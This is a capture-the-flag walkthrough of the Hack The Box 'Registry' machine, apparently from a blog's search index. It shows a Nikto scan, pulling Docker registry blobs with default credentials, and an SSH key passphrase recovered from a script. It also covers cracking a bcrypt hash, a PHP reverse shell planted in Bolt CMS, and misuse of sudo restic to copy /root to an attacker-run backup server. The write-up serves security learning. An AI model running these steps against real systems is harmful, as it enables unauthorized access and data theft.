Nikto v2.1.6 --------------------------------------------------------------------------- + Target IP: 10.10.10.159 + Target Hostname: 10.10.10.159 + Target Port: 443 --------------------------------------------------------------------------- + SSL Info: Subject: /CN=docker.registry.htb Ciphers: ECDHE-RSA-AES256-GCM-SHA384 Issuer: /CN=Registry + Start Time: 2020-04-02 21:44:11 (GMT5.75) --------------------------------------------------------------------------- + Server: nginx/1.14.0 (Ubuntu) + The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS + The site uses SSL and Expect-CT header is not present. + No CGI Directories found (use '-C all' to force check all possible dirs) + Hostname '10.10.10.159' does not match certificate's names: docker.registry.htb + The Content-Encoding header is set to \"deflate\" this may mean that the server is vulnerable to the BREACH attack. + OSVDB-3092: /install/: This might be interesting... + 7876 requests: 8 error(s) and 5 item(s) reported on remote host + End Time: 2020-04-03 00:49:25 (GMT5.75) (11114 seconds) --------------------------------------------------------------------------- + 1 host(s) tested ","date":"2020-04-04","objectID":"/registery/:4:1","tags":["htb","linux","boltcms","restic-server","port-forward"],"title":"Registry","uri":"/registery/"},{"categories":["hackthebox"],"content":"Docker Registry Exploit Then I found the dir with dirsearch as http://docker.registry.htb/v2/ and able to login with creds admin:admin. So I googled about it and found the interesting blog which explain how can we exploit the docker registry to download the stored files. You can find it here. Then I used this blog to exploit the docker registry and downloaded the file as root@gr4n173:~$ curl --user \"admin:admin\" http://docker.registry.htb/v2/bolt-image/manifests/latest [80/311] { \"schemaVersion\": 1, \"name\": \"bolt-image\", \"tag\": \"latest\", \"architecture\": \"amd64\", \"fsLayers\": [ { \"blobSum\": \"sha256:302bfcb3f10c386a25a58913917257bd2fe772127e36645192fa35e4c6b3c66b\" }, { \"blobSum\": \"sha256:3f12770883a63c833eab7652242d55a95aea6e2ecd09e21c29d7d7b354f3d4ee\" }, { \"blobSum\": \"sha256:02666a14e1b55276ecb9812747cb1a95b78056f1d202b087d71096ca0b58c98c\" }, { \"blobSum\": \"sha256:c71b0b975ab8204bb66f2b659fa3d568f2d164a620159fc9f9f185d958c352a7\" }, { \"blobSum\": \"sha256:2931a8b44e495489fdbe2bccd7232e99b182034206067a364553841a1f06f791\" }, { \"blobSum\": \"sha256:a3ed95caeb02ffe68cdd9fd84406680ae93d633cb16422d00e8a7c22955b46d4\" }, { \"blobSum\": \"sha256:f5029279ec1223b70f2cbb2682ab360e1837a2ea59a8d7ff64b38e9eab5fb8c0\" }, { \"blobSum\": \"sha256:d9af21273955749bb8250c7a883fcce21647b54f5a685d237bc6b920a2ebad1a\" }, { \"blobSum\": \"sha256:8882c27f669ef315fc231f272965cd5ee8507c0f376855d6f9c012aae0224797\" }, { \"blobSum\": \"sha256:f476d66f540886e2bb4d9c8cc8c0f8915bca7d387e536957796ea6c2f8e7dfff\" } From above I saw the files name which start with sha256 and downloaded to my local machine as zip file and unzipped it. After all I found interesting folder name with file 01-ssh.ssh sha256_302bfcb3f10c386a25a58913917257bd2fe772127e36645192fa35e4c6b3c66b and got this as output. #!/usr/bin/expect -f #eval `ssh-agent -s` spawn ssh-add /root/.ssh/id_rsa expect \"Enter passphrase for /root/.ssh/id_rsa:\" send \"GkOcz221Ftb3ugog\\n\"; expect \"Identity added: /root/.ssh/id_rsa (/root/.ssh/id_rsa)\" interact this way I got the passphraase and id_rsa and able to ssh in as bolt. root@gr4n173:~$ ssh -i id_rsa bolt@registry.htb The authenticity of host 'registry.htb (10.10.10.159)' can't be established. ECDSA key fingerprint is SHA256:G1J5ek/T6KuCCT7Xp2IN1LUslRt24mhmhKUo/kWWVrs. Are you sure you want to continue connecting (yes/no/[fingerprint])? yes Warning: Permanently added 'registry.htb' (ECDSA) to the list of known hosts. Enter passphrase for key 'id_rsa': Welcome to Ubuntu 18.04.3 LTS (GNU/Linux 4.15.0-65-generic x86_64) System information as of Fri Apr 3 07:54:40 UTC 2020 System load: 0.0 Users logged in: 1 Usage of /: 6.1% of 61.80GB IP address for eth0: 10.10.10.159 Memory usage: 49% IP address for docker0: 172.17.0.1 Swap usage: 0% IP address for br-1bad9bd75d17: 172.18.0.1 Processes: 157 Last login: Fri Apr 3 06:36:39 2020 from 10.10.14.18 bolt@bolt:~$ whoami bolt bolt@bolt:~$ cat user.txt ytc0yt*************** This way I got the user bolt. ","date":"2020-04-04","objectID":"/registery/:4:2","tags":["htb","linux","boltcms","restic-server","port-forward"],"title":"Registry","uri":"/registery/"},{"categories":["hackthebox"],"content":"To Root ","date":"2020-04-04","objectID":"/registery/:5:0","tags":["htb","linux","boltcms","restic-server","port-forward"],"title":"Registry","uri":"/registery/"},{"categories":["hackthebox"],"content":"Web Enumeration After a lot of dir search with different wordlist I finally got the login page of bolt cms site as. Fig: Login Page then I searched everypart of the bolt shell and got the hash in dir /var/www/html/app/database/bolt.db and on cat I got the hash $2y$10$e.ChUytg9SrL7AsboF2bX .wWKQ1LkS5Fi/Z0yYD86.P5E9cpY7P. Now I used john to crack the hash and got the password strawberry. root@gr4n173:~$ john hash -wordlist=/usr/share/wordlists/rockyou.txt [sudo] password for bikram: Using default input encoding: UTF-8 Loaded 1 password hash (bcrypt [Blowfish 32/64 X3]) Cost 1 (iteration count) is 1024 for all loaded hashes Will run 4 OpenMP threads Press 'q' or Ctrl-C to abort, almost any other key for status strawberry (?) 1g 0:00:00:05 DONE (2020-04-03 14:02) 0.1992g/s 71.71p/s 71.71c/s 71.71C/s strawberry..brianna Use the \"--show\" option to display all of the cracked passwords reliably Session completed I used that creds(admin:strawerry) and logged in bolt cms. Fig: Admin User ","date":"2020-04-04","objectID":"/registery/:5:1","tags":["htb","linux","boltcms","restic-server","port-forward"],"title":"Registry","uri":"/registery/"},{"categories":["hackthebox"],"content":"Unprivileged User After logged in, I searched every part of cms and found the file upload field where I was unable to upload the php file. Since I was admin edited and added php extension in file config.yml which was located at url http://registry.htb/bolt/bolt/file/edit/config/config.yml with a php-reverse-shell.php and listener on. I found one interesting blog CSRF-TO-RCE you can read it. Fig: Uploaded File Listner on: root@gr4n173:~$ nc -lvnp 8888 listneing on [any] 8888 connect to [127.0.0.1] from (UNKNOWN) [127.0.0.1] 58100 Linux bolt 4.15.0-65-generic #74-Ubuntu SMP Tue Sep 17 17:06:04 UTC x86_64 uid=33(www-data) gid=33(www-data) groups=33(www-data) /bin/sh: 0 can't access tty;job contorl turned off $ $python -c \"import pty;pty.spawn('/bin/bash')\" www-data@bolt:$sudo -l Matching Defaults entries for www-data on bolt: env_reset, exempt_group=sudo, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin User www-data may run the following commands on bolt: (root) NOPASSWD: /usr/bin/restic backup -r rest* As, I saw the restic server running as root then searched for files and got backup.php www-data@bolt:/var/www/html$ cat backup.php \u003c?php shell_exec(\"sudo restic backup -r rest:http://backup.registry.htb/bolt bolt\"); Restic Server Then I searched about restic server and collected knowledge you can find here and at first I download to my localhost then started the restic server as you can find file rest-server. root@gr4n173:~$ rest-server --path . --no-auth Data directory: . Authentication disabled Private repositories disabled Starting server on:8000 Creating repository directories in . Creating repository directories in . Now before directly using the rest-server in machine I used and in my local machine and it worked. root@gr4n173:~$ restic -r http://10.10.14.129:8000 init enter password for new repository: enter password again: created restic repository 39fcbee204 at rest:http://10.10.14.129:8000 Please note that knowledge of your password is required to access the repository. Losing your password means that your data is irreversibly lost. Port Forwarding After, it worked in my local machine I port forward from 8000 to 1234 ( this willn’t work if your python is active at 8000 then it will route to another port ). root@gr4n173:~$ ssh bolt@10.10.10.159 -i id_rsa -R 1234:127.0.0.1:8000 Enter passphrase for key 'id_rsa': Welcome to Ubuntu 18.04.3 LTS (GNU/Linux 4.15.0-65-generic x86_64) System information as of Mon Nov 11 14:1018 UTC 2019 System Load: 0.02 Users logged in: 1 Usage of /: 6.5% of 61.80GB IP address for eth0: 10.10.10.159 Memory usage: 53% IP address for br-1bad9bd75d17: 172.18.0.1 Swap usage: 1% IP address of docker0: 172.17.0.1 Processes: 206 =\u003e There is 1 zombies process. Last Login: Mon Nov 11 14:1018 2019 from 10.10.15.129 bolt@bolt:~$whoami bolt At first I used the full directory of restic server but that doesn’t work so I used below command in www-data shell ","date":"2020-04-04","objectID":"/registery/:5:2","tags":["htb","linux","boltcms","restic-server","port-forward"],"title":"Registry","uri":"/registery/"},{"categories":["hackthebox"],"content":"Rest-Server Backup Files www-data@bolt:~$ sudo restic backup -r rest:http://127.0.0.1:1234 /root/ sudo restic backup -r rest:http://127.0.0.1:1234 /root/ enter password for repository: something password is correct found 1 old cache directories in /var/www/.cache/restic, pass --cleanup-cache to scan [/root] scanned 18 directories, 19 files in 0:00 [0:03] 100.00% 39.690 KiB / 39.690 KiB 37 /37 items 0 errors ETA 0:00 duration: 0:03 snapshot 4bf1b3af saved Finally I restored and checked the restic server directory and got the files as root@gr4n173:~$ restic restore 4bf1b3af915544c9d15d4aa741731382c9fd2dc68ffec7f769a237aaf52c2c02 enter password for repository: repository 39fcbee2 opened succesfully, password is correct created new cache in /root/.cache/restic restorying \u003cSnapshot 4bf1b3af of [/root] at 2019-11-11 14:13:38.38.895820081 +0000 UTC \u003e root@bolt to . Then I checked back to the folder snapshot and got the root.txt root@gr4n173:~/snapshots$ ls 4bf1b3af915544c9d15d4aa741731382c9fd2dc68ffec7f769a237aaf52c2c02 root root@gr4n173:~/snapshots$ cd root root@gr4n173:~/snapshots/root$ ls config.yml cron.sh root.txt root@gr4n173:~/snapshots/root$ cat root.txt ntrkz********************* This way I got the root of Registry box and learned alot from this box. So I would like to thank creator of this box thek for such an awesome box. Especially downloading the backup files from restic server was new one. I will be posting writeup of next box after box retired. I would like to Thank readers for being with me through out this writeup. Feedback are really appreciated !! Tweet about this writeup if you like. You can see more blog at my medium here: gr4n173. ","date":"2020-04-04","objectID":"/registery/:5:3","tags":["htb","linux","boltcms","restic-server","port-forward"],"title":"Registry","uri":"/registery/"},{"categories":null,"content":"Hi there, I am a nerd guy who loves everything in between Internet and Security. Reaching out to people and teaching about CyberSecurity is what I love. I like to play with electronics in my spare time so that I can automate my lifestyle. Though loving techology and infosec is one part, I m a nature admire too who love to travel and enjoy the beauty of nature. ","date":"2020-01-02","objectID":"/about/:0:0","tags":null,"title":"About Me","uri":"/about/"}]